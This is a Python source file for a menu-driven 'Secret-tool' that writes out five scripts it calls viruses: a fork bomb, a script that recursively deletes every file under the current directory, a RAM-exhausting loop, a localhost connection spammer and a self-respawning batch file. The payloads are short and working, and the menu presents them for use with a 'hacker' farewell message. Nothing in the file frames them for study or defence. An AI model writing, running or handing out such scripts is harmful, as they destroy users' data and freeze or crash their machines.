import os
import time

def create_fork_bomb():
    # Creates a fork bomb
    with open("fork_bomb.py", "w") as f:
        f.write("import os\nwhile True:\n\tos.fork()")

def create_file_deleter():
    # Creates a virus that deletes files
    with open("file_deleter.py", "w") as f:
        f.write("import os\nfor root, dirs, files in os.walk('.'):\n\tfor file in files:\n\t\tos.remove(os.path.join(root, file))")

def create_memory_filler():
    # Creates a virus that fills up RAM
    with open("memory_filler.py", "w") as f:
        f.write("a = []\nwhile True:\n\ta.append(' '*10**6)")

def create_network_spammer():
    # Creates a virus that spams the network
    with open("network_spammer.py", "w") as f:
        f.write("import socket\nwhile True:\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(('127.0.0.1', 80))\n\ts.send(b'GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n')")

def create_boot_loop():
    # Creates a virus that forces a boot loop
    with open("boot_loop.bat", "w") as f:
        f.write("@echo off\n:start\nstart %0\ngoto start")

def display_menu():
    print("""
    ███████╗███████╗ ██████╗██████╗ ███████╗████████╗
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝
    ███████╗█████╗  ██║     ██████╔╝█████╗     ██║   
    ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   
    ███████║███████╗╚██████╗██║  ██║███████╗   ██║   
    ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
    """)
    print("Welcome to the Secret-tool! Choose a virus to create:")
    print("1. 🧨 Fork Bomb")
    print("2. 🗑️ File Deleter")
    print("3. 🧠 Memory Filler")
    print("4. 🌐 Network Spammer")
    print("5. 🔄 Boot Loop")
    print("6. 🚪 Exit")

def main():
    while True:
        display_menu()
        choice = input("Choose a number (1-6): ")

        if choice == "1":
            create_fork_bomb()
            print("Fork Bomb created: fork_bomb.py")
        elif choice == "2":
            create_file_deleter()
            print("File Deleter created: file_deleter.py")
        elif choice == "3":
            create_memory_filler()
            print("Memory Filler created: memory_filler.py")
        elif choice == "4":
            create_network_spammer()
            print("Network Spammer created: network_spammer.py")
        elif choice == "5":
            create_boot_loop()
            print("Boot Loop created: boot_loop.bat")
        elif choice == "6":
            print("See you later, hacker! 🏴‍☠️")
            break
        else:
            print("Invalid choice. Try again.")

        time.sleep(2)  # Pause for dramatic effect

if __name__ == "__main__":
    main()
